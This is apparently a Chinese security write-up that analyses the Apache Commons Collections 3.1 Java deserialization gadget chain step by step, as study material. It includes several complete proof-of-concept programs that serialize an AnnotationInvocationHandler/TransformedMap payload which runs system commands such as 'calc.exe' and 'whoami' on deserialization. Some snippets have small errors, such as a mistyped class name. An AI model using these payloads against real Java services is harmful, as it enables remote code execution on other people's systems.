commons-collections-3.1
=======================

Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。

Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展

该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入

选择版本为3.1，[下载地址](https://archive.apache.org/dist/commons/collections/),

```xml
        <dependencies>
            <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
            <dependency>
                <groupId>commons-collections</groupId>
                <artifactId>commons-collections</artifactId>
                <version>3.1</version>
            </dependency>
        </dependencies>

```

poc执行过程
=======

```java
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Commons_collections_Test {

    public static void main(String[] args) throws Exception {
        //1.客户端构建攻击代码
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        //创建Map并绑定transformerChain
        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        //给予map数据转化链
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class, outerMap);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(instance);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();
    }

}
```

调用栈

[![RDx3CR.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6af74b212d605be761c661e7ba143cc16c7db3ce.png)](https://imgtu.com/i/RDx3CR)

`org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#setValue`

首先进入的是`setValue()`方法，调用了`checkSetValue()`

[![RDxQUJ.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2f003a608168ca056606c41959df8c7e5b845f92.png)](https://imgtu.com/i/RDxQUJ)

`org.apache.commons.collections.map.TransformedMap#checkSetValue`

`this.valueTransformer`等于`ChainedTransformer`类，调用了`ChainedTransformer`类中的`transform`方法

[![RDx881.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4c97ff9108079febec06e5a179b283668f75a33f.png)](https://imgtu.com/i/RDx881)

`org.apache.commons.collections.functors.ChainedTransformer#transform`

[![RDxl59.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05067e96ff2bb8ae754b14559e8138f0beec9c55.png)](https://imgtu.com/i/RDxl59)

根据`this.iTransformers`数组的值可以知道，第一次进入的是`ConstantTransformer`类的`transform`方法，后三次进入的是`InvokerTransformer`类的`transform`。`transform`的返回值会作为下个`transform`函数的参数，然后继续执行

[![RDxdVe.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-87669bc29c18bbce72f8c43f3d5e57c12ed7e0a4.png)](https://imgtu.com/i/RDxdVe)

看一下`ChainedTransformer`的构造函数，可以发现`this.iTransformers`可控

[![RDxo2q.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-646db05311199665dab8d963efd1bd9ba53b1cc9.png)](https://imgtu.com/i/RDxo2q)

`org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer`

第一次进入的`transform`

[![RDxUbD.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db24af66cc174f4dacd09be06a5ff0b7364d7f2d.png)](https://imgtu.com/i/RDxUbD)

`org.apache.commons.collections.functors.InvokerTransformer#transform`

后三次进入`InvokerTransformer`的`Transformer`方法，这里存在反射调用，参数可控。

执行过程

- setValue()
- checkSetvalue()
- ChainedTransformer类中的`transform`方法
- 四次循环，第一次进入ConstantTransformer的transform，后三次进入InvokerTransformer的transform
- 触发反射

反射链
===

`org.apache.commons.collections.functors.InvokerTransformer#transform`

这里实现了反射调用，如果`input`等于`Runtime类`，那么`input.getClass`获取到的是`java.lang.class`，这样无法获取到方法，必须让`input`等于`Runtime实例`

```java
public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {

                //input必须为Runtime的实例，cls才会等于Runtime类，
                Class cls = input.getClass();

                //this.iMethodName等于exec，this.iParamTypes等于String.class
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                //this.Args为要执行的命令
                return method.invoke(input, this.iArgs); 
            } 
           .........
    }
}
```

看一下构造函数，三个属性都是传入参数

[![RDxNDO.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dcbfeb3a9919527ff66af55a5db7c517e1fcb450.png)](https://imgtu.com/i/RDxNDO)

参考反射命令执行代码

```java
Class.forName("java.lang.Runtime")
                .getMethod("exec", String.class)
                .invoke(                        Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))
                        ,
                        "calc.exe"
                );
```

需要满足以下条件

```java
this.iMethodName=“exec”
this.iParamTypes=String.class
input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))
this.iArgs="calc.exe"
```

尝试尝试构造执行命令

```java
import org.apache.commons.collections.functors.InvokerTransformer;

public class Commons_collections_Test {
    public static void main(String[] args) throws Exception {
        InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
        invokerTransformer.transform(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")));

    }
}

```

[![RDxwUH.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-72c5aabe4db502df4edc9b3bae71fc5cc1322db0.png)](https://imgtu.com/i/RDxwUH)

可以成功执行，但是还存在一个问题就是无法传入`Runtime`的实例对象。

两种获取Runtime实例的错误思路
------------------

用readObject模拟反序列化

序列化

```java
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Commons_collections_Test {

    public static void main(String[] args) throws Exception {

        //构造InvokerTransformer
        InvokerTransformer a=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});

        //序列化
        FileOutputStream f=new FileOutputStream("payload.bin");
        ObjectOutputStream fout=new ObjectOutputStream(f);
        fout.writeObject(a);

        //构造传入transform的参数，Runtime实例
        Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));

        //反序列化
        FileInputStream fi=new FileInputStream("payload.bin");
        ObjectInputStream fin=new ObjectInputStream(fi);
        InvokerTransformer b=(InvokerTransformer) fin.readObject();

        //触发漏洞，调用transform，input为传入参数
        b.transform(input);
    }
}
```

反序列化

可以看到存在一个问题，必须给`transform`传入一个构造好的Runtime实例也就是`input`才可以触发漏洞，实际环境里不可能有这样一个构造好的实例，那么能否利用反序列化给`transform`传入Runtime实例呢？

```java
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Serial implements Serializable  {
    public static void main(String[] args) throws Exception{
        //构造传入transform的参数，为Runtime实例，
        Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));

        //反序列化
        FileInputStream fi=new FileInputStream("payload.bin");
        ObjectInputStream fin=new ObjectInputStream(fi);
        InvokerTransformer b=(InvokerTransformer) fin.readObject();

        //触发漏洞，调用transform，input为传入参数
        b.transform(input);
    }
}

```

[![RDxr8I.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b09d3358225ee9b53b3b36a381f703c155af4d7f.png)](https://imgtu.com/i/RDxr8I)

`org.apache.commons.collections.functors.ChainedTransformer#transform`

这里可以控制传入`transform`的参数，因为`object`的来源是上一次`this.ITransformers[i].transform`的返回值，而且因为`iTransformers`可控，我们可以调用任意一个类的`transform`方法

[![RDxl59.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05067e96ff2bb8ae754b14559e8138f0beec9c55.png)](https://imgtu.com/i/RDxl59)

`org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer`

这里我们可以控制`this.iContant`，它会等于下一次执行的传入参数`object`。表面上看让它等于`Runtime实例`就解决了之前无法传入`Runtime`实例的问题，但是实际上并不可行，因为Runtime类不能被反序列化

[![RDxUbD.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db24af66cc174f4dacd09be06a5ff0b7364d7f2d.png)](https://imgtu.com/i/RDxUbD)

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Commons_collections_Test {

    public static void main(String[] args) throws Exception {

        //构造Transformers数组
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),
                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"})
        };

        //用ChainedTransformer封装构造好的Transformers数组，也就是让构造好的数组等于this.iTransformers
        Transformer transformerChain=new ChainedTransformer(transformers);

        //序列化
        FileOutputStream f=new FileOutputStream("payload.bin");
        ObjectOutputStream fout=new ObjectOutputStream(f);
        fout.writeObject(transformerChain);

    }
}
```

执行失败

[![RDxDPA.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-da1d4c24a3f0120dabbf480ff31d94e968fcfd48.png)](https://imgtu.com/i/RDxDPA)

换一种思路，有没有可能利用反射直接在服务器生成一个Runtime实例？

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Commons_collections_Test {

    public static void main(String[] args) throws Exception {

        //构造transformers
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getRuntime",new Class[]{},new Object[]{}),
                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"})
        };

        Transformer transformerChain=new ChainedTransformer(transformers);

        transformerChain.transform(null);
    }
}
```

依然报错，原因是前面提到的反射机制，`Runtime.class`返回`java.lang.class`，这里我们必须把`Runtime.class`换成`Runtime实例.class`才能按预想中的执行，但是我们现在就在想办法得到`Runtime实例`，这样就变成一个死循环了。这个方法也不行

[![RDx05d.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-502c853b23847138e3b56b99d66a0638dfc51fd9.png)](https://imgtu.com/i/RDx05d)

反射+反射
-----

`getRuntime`方法会返回`Runtime实例`，只要获取到了`getRuntime`方法再`invoke`执行就等于获取到了`Runtime实例`。既然无法直接获取Runtime实例，那可以去尝试获取getRuntime方法。

**注意：开始传入的是java.lang.class类（Runtime.class）**

步骤

1. 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制
2. 通过getMethod函数获取Runtime类中的getRuntime函数。在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的
3. 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数
4. invoke调用getRuntime函数，获取Runtime类的实例。里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类

**关于反射**

类.getMethod(要获取的方法名,要获取方法的参数类型) 获得方法对象  
方法对象.invoke(相关类实例/相关类,参数) 执行方法

invoke的第一个参数是执行method的对象obj：  
如果这个方法是一个普通方法，那么第一个参数是类对象  
如果这个方法是一个静态方法，那么第一个参数是类

接下来分析一下利用反射机制进行反射调用的过程

第一次循环直接返回了`Runtime.class`

[![RDxUbD.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db24af66cc174f4dacd09be06a5ff0b7364d7f2d.png)](https://imgtu.com/i/RDxUbD)

```php
input1=Runtime.class
```

第二次

实际执行的代码

```java
 //第二次循环
        Class cls2=input1.getClass(); //cls2:java.lang.class类
        Method method2=cls2.getMethod("getMethod", String.class, Class[].class);//method2:通过反射获取到的getMethod对象
        Object input2=method2.invoke(input1,new Object[] {"getRuntime", new Class[]{} });//input2:getRuntime对象
```

[![RDxh5j.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-853e6de69a09fe98e8941ab0de484ea6c4de0cde.png)](https://imgtu.com/i/RDxh5j)

[![RDxfaQ.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0aa5cc34bd03636ebc075b216c4aba5c130d8175.png)](https://imgtu.com/i/RDxfaQ)

[![RDxIGn.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-627575a4a08934830ef7176f7623bd53ab4a4072.png)](https://imgtu.com/i/RDxIGn)

第三次循环，最重要的一步，先用反射获取`invoke方法对象`，然后利用`invoke方法对象.invoke`执行传入`getRuntime`方法对象，得到`Runtime`实例

```java
//第三次循环，input是通过反射获取到的getRuntime对象
        Class cls3=input2.getClass();//java.lang.reflec.Method类
        Method method3=cls3.getMethod("invoke", new Class[] {Object.class, Object[].class });//method3:invoke方法对象.第二个参数为invoke的参数类型

        //invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)
        Object input3=method3.invoke(input2,new Object[] {null, new Object[]{} }); //input3:Runtime实例
```

[![RDxs2t.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-635da9bb08942a0f6f7219972b1283d64dd89660.png)](https://imgtu.com/i/RDxs2t)

[![RDxgr8.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-71de7ed37d1f632027fc77b346ba74c812451464.png)](https://imgtu.com/i/RDxgr8)

第四次循环

```java
 //第四次循环，已经获取到了Runtime实例
        Class cls4=input3.getClass(); //cls4:java.lang.Runtime类
        Method method4=cls4.getMethod("exec",new Class[] {String.class });//method4:exec方法对象
        method4.invoke(input3,new Object[] {"calc.exe"});//exec方法对象.invoke(Runtime实例,参数)
```

[![RDxcKf.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f6cf6b2a4ba3a4e1d432ef337de8c6af212e4432.png)](https://imgtu.com/i/RDxcKf)

[![RDx2qS.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1ab22fb32094fac9309cdcb4516c5e1b960aec3d.png)](https://imgtu.com/i/RDx2qS)

简化流程

```java
import java.lang.reflect.Method;

public class Commons_collections_Test {

    public static void main(String[] args) throws Exception {

        //第一次循环,返回了Runtie.class
        Class input1=Runtime.class;

        //第二次循环
        Class cls2=input1.getClass(); //cls2:java.lang.class类
        Method method2=cls2.getMethod("getMethod", String.class, Class[].class);//method2:通过反射获取到的getMethod对象
        Object input2=method2.invoke(input1,new Object[] {"getRuntime", new Class[]{} });//input2:getRuntime对象

        //第三次循环，input是通过反射获取到的getRuntime对象
        Class cls3=input2.getClass();//java.lang.reflec.Method类
        Method method3=cls3.getMethod("invoke", new Class[] {Object.class, Object[].class });//method3:invoke方法对象.第二个参数为invoke的参数类型

        //invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)
        Object input3=method3.invoke(input2,new Object[] {null, new Object[]{} }); //input3:Runtime实例

        //第四次循环，已经获取到了Runtime实例
        Class cls4=input3.getClass(); //cls4:java.lang.Runtime类
        Method method4=cls4.getMethod("exec",new Class[] {String.class });//method4:exec方法对象
        method4.invoke(input3,new Object[] {"calc.exe"});//exec方法对象.invoke(Runtime实例,参数)

    }
}
```

反序列化触发点
=======

到目前为止我们已经构造好了反射利用链，现在来看一下如何触发，触发需要两个条件

1. 服务器调用readObject反序列化构造好的ChainedChainedTransformer
2. 调用反序列化后的ChainedTransformer类中的transform方法执行命令

代码如下，实际环境中基本不可能满足这两个条件，因此我们需要寻找其他触发方式

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Commons_collections_Test {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                //根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        //把构造好的数组封装成ChainedTransformer
        ChainedChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

        //序列化数据
        FileOutputStream fileOutputStream=new FileOutputStream("payload.bin");
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(chainedTransformer);

        //反序列化数据
        FileInputStream fileInputStream=new FileInputStream("payload.bin");
        ObjectInputStream objectInputStream=new ObjectInputStream(fileInputStream);

        //调用反序列化后的ChainedTransformer类中的transform方法触发
        ChainedTransformer SerialChainTransformer=(ChainedTransformer)objectInputStream.readObject();
        SerialChainTransformer.transform(null);

    }
}
```

关于Map的一些补充知识
------------

Map是java中的接口，Map.Entry是Map的一个内部接口

- keySet()方法返回Map中key值的集合
- entrySet()返回一个Set集合，集合类型为Map.Entry（键值对）
- Map.Entry是Map声明的一个内部接口，Map.Entry表示一个实体即键值对（key-value对）
- getKey()，getValue方法可以修改集合中的元素

绑定Map和ChainedTransformer
------------------------

**为什么要绑定Map和ChainedTransformer?**

之前我们把构造好的Transformer数组封装成了一个ChainedTransformer，TransformerMap类的decorate方法可以绑定map和ChainedTransformer，只要在map中添加数据就会自动调用构造好的ChainedTransformer，执行payload，这样降低了触发的难度

**目前的执行过程**

1. 创建一个Map和一个构造好反射链的ChainedTransformer
2. 调用TransformedMap类的decorate方法创建一个实例，绑定创建好的Map和ChainedTransformer
3. 利用setValue()函数修改TransformedMap中的键值
4. 触发ChainedTransformer中的Transform反射链

`org.apache.commons.collections.map.TransformedMap#decorate`

[![RDxTx0.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9d633d7d492f53099a4b9e21d9b70133d3c8962e.png)](https://imgtu.com/i/RDxTx0)

**TransformedMap类的功能？**

Map类是保存键值对的数据结构，common collections中实现了一个TransformedMap类，这个类可以在键值对的key或者value被修改时自动调用我们设置的transform方法进行修饰和变换。decorate方法可以创建一个TransformedMap的实例。

**decorate方法的功能？**

创建一个TransformedMap实例，绑定Map和转换方法  
它的第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。

代码实例

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class Commons_collections_Test {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                //根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        //把构造好的数组封装成ChainedTransformer
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

        Map innerMap=new HashMap();
        innerMap.put("value","value");

        Map map=TransformedMap.decorate(innerMap,null,chainedTransformer);

        //序列化map
        FileOutputStream fileOutputStream=new FileOutputStream("payload.bin");
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(map);

        FileInputStream fileInputStream=new FileInputStream("payload.bin");
        ObjectInputStream objectInputStream=new ObjectInputStream(fileInputStream);
        //反序列化
        Map UnserializedMap=(Map)objectInputStream.readObject();

        //只要修改Map的值就会触发转换链，执行payload

        //向Map中添加新值
        //UnserializedMap.put("123","123");
        //修改键值
        Map.Entry entry  = (Map.Entry) UnserializedMap.entrySet().iterator().next();
        entry.setValue("foobar");

    }
}
```

**目前存在的问题？**

现在触发条件变成了经过迭代器迭代调用`setValue`函数修改`Map`值来触发漏洞，

但是仍然依赖于调用`setValue()`，需要进一步延长利用链，在调用readObject()方法时直接触发payload

AnnotationInvocationHandler的readObject复写点
-----------------------------------------

**进一步延长利用链**

java在反序列化中会优先调用复写的readObject，那么如果某个可以被序列化中的类重写了readObject()方法，并且在readObject()方法中存在修改Map类型变量键值的操作，同时Map类型变量可控的话，就可以实现一步到位，一调用readObject()就触发payload。

概括一下目标类需要满足的三个条件

1. 存在复写的readObject()方法
2. readObject()方法中存在修改Map类型变量键值的操作
3. Map类型变量可控

这个类就是`sun.reflect.annotation.AnnotationInvocationHandler`

`AnnotationInvocationHandler`构造函数

可以看到有一个可控的成员变量`memberValues`，接收传入的Map参数，

[![RDxHMV.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4fe9bb793ff4da108a4280f9302242ca68d88164.png)](https://imgtu.com/i/RDxHMV)

`sun.reflect.annotation.AnnotationInvocationHandler#readObject`

这里对`memberValues`进行了`setValue`操作，触发payload

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            return;
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6))); //存在setValue
                }
            }
        }

    }
```

总结
==

过程总结

1. 首先构造一个Map和一个能够执行代码的ChainedTransformer()，
2. 调用TransformedMap.decorate绑定Map和ChainedTransformer，生成一个TransformedMap实例
3. 实例化AnnotationInvocationHandler类，并对其进行序列化，
4. 当触发readObject()反序列化的时候，就能实现命令执行。

```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class POC_Test{
    public static void main(String[] args) throws Exception {
        //execArgs: 待执行的命令数组
        //String[] execArgs = new String[] { "sh", "-c", "whoami &gt; /tmp/fuck" };

        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            /*
            由于Method类的invoke(Object obj,Object args[])方法的定义
            所以在反射内写new Class[] {Object.class, Object[].class }
            正常POC流程举例：
            ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
            */
            new InvokerTransformer(
                "getMethod",
                new Class[] {String.class, Class[].class },
                new Object[] {"getRuntime", new Class[0] }
            ),
            new InvokerTransformer(
                "invoke",
                new Class[] {Object.class,Object[].class }, 
                new Object[] {null, null }
            ),
            new InvokerTransformer(
                "exec",
                new Class[] {String[].class },
                new Object[] { "whoami" }
                //new Object[] { execArgs } 
            )
        };

        //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
        Transformer transformedChain = new ChainedTransformer(transformers);

        //BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict
        //Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;();
        Map<String,String> BeforeTransformerMap = new HashMap<String,String>();

        BeforeTransformerMap.put("hello", "hello");

        //Map数据结构，转换后的Map
       /*
       TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。
            第一个参数为待转化的Map对象
            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
            第三个参数为Map对象内的value要经过的转化方法。
       */
        //TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);
        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);

        File f = new File("temp.bin");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
    }
}

/*
思路:构建BeforeTransformerMap的键值对，为其赋值，
     利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme
     对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行

     执行本质: ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(.........)
     利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()

*/
```

参考
==

[以Commons-Collections为例谈Java反序列化POC的编写 - 安全客，安全资讯平台](https://www.anquanke.com/post/id/195865)

[Java 反序列化漏洞始末（1）— Apache Commons - 浅蓝 's blog](https://b1ue.cn/archives/166.html)

[Apache Commons Collections反序列化漏洞分析与复现 - 安全客，安全资讯平台](https://www.anquanke.com/post/id/224487)

[Threezh1'Blog](https://threezh1.com/2020/12/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80_CommonCollection31%E5%88%86%E6%9E%90/#Apache-CommonsCollections3-1-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90)

\[Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析 | Passer6y's Blog\](<https://0day.design/2020/01/24/Apache-Commons-Collections-3.1> 反序列化漏洞分析/)

[Apache-Commons-Collections反序列化漏洞分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/175252.html)

[Apache Commons Collections 反序列化详细分析学习总结 - tr1ple - 博客园](https://www.cnblogs.com/tr1ple/p/11505122.html)

[JAVA反序列化 - Commons-Collections组件](https://xz.aliyun.com/t/7031)